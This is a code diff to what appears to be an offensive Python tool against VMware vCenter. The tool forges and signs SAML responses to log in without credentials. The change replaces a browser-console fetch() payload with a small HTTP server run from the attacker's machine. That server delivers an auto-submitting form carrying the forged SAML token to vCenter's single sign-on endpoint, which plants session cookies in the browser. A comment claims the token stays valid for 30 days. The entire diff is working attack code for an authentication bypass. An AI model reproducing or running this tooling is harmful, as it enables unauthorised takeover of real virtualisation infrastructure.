@@ -2037,7 +2037,8 @@ def main():
                                                      key_pem, cert1_pem, cert2_pem, authn_id)
 
         if choice == '1':
-            import json
+            import http.server, threading, socket as _socket
+
             # Python-side login — proves the token works and shows the cookie values
             cname, cval, ui_session = saml_login(target, signed, relay_state)
             print(f'\n[+] https://{target}/ui/')
@@ -2047,22 +2048,52 @@ def main():
                 if v:
                     print(f'    {extra}={v}')
 
-            # IdP-initiated SAML (no InResponseTo, no RelayState) — vCenter accepts
-            # this and returns 302 → /ui/ directly.  No relay-state TTL to race.
-            # Run from DevTools console on any https://target/ page (same-origin so
-            # vCenter sets HttpOnly cookies directly into the browser's jar).
+            # IdP-initiated SAML delivered via standard HTTP POST binding.
+            # Kali serves one HTML page; the page auto-submits a form directly
+            # to vCenter's ACS endpoint.  vCenter's 302 sets HttpOnly cookies
+            # in the browser's jar (same as any real IdP post-binding flow).
+            # No relay-state TTL to race; SAML is valid for 30 days.
             signed2  = build_and_sign_saml(target, hostname, domain,
                                            key_pem, cert1_pem, cert2_pem, authn_id='')
             saml_b64 = base64.b64encode(signed2).decode()
-            js_cmd = ''.join([
-                "fetch('/ui/saml/websso/sso',{",
-                "method:'POST',credentials:'include',",
-                "headers:{'Content-Type':'application/x-www-form-urlencoded'},",
-                f"body:new URLSearchParams([['SAMLResponse',{json.dumps(saml_b64)}]])",
-                "}).then(()=>location.replace('/ui/'));",
-            ])
-            print(f'\n[+] Open DevTools (F12) on https://{target}/ and paste in Console:')
-            print(f'\n    {js_cmd}')
+
+            try:
+                _sock = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
+                _sock.connect((target, 443))
+                local_ip = _sock.getsockname()[0]
+                _sock.close()
+            except Exception:
+                local_ip = '0.0.0.0'
+
+            html = (
+                '<!DOCTYPE html><html><body>'
+                '<p style="font-family:monospace">Authenticating to vCenter...</p>'
+                f'<form id="f" method="POST" action="https://{target}/ui/saml/websso/sso">'
+                f'<input type="hidden" name="SAMLResponse" value="{saml_b64}">'
+                '</form>'
+                '<script>document.getElementById("f").submit();</script>'
+                '</body></html>'
+            ).encode()
+
+            class _H(http.server.BaseHTTPRequestHandler):
+                def do_GET(self):
+                    self.send_response(200)
+                    self.send_header('Content-Type', 'text/html; charset=utf-8')
+                    self.send_header('Content-Length', str(len(html)))
+                    self.end_headers()
+                    self.wfile.write(html)
+                def log_message(self, *_):
+                    pass
+
+            srv = http.server.HTTPServer(('0.0.0.0', 0), _H)
+            port = srv.server_address[1]
+            threading.Thread(target=srv.serve_forever, daemon=True).start()
+
+            print(f'\n[+] Open in your browser (any machine on this subnet):')
+            print(f'\n    http://{local_ip}:{port}/')
+            print(f'\n    The page auto-submits the SAML form → vCenter sets cookies → /ui/')
+            input('\n    Press Enter when done to stop the server...\n')
+            srv.shutdown()
             return
 
         cname, cval, ui_session = saml_login(target, signed, relay_state)
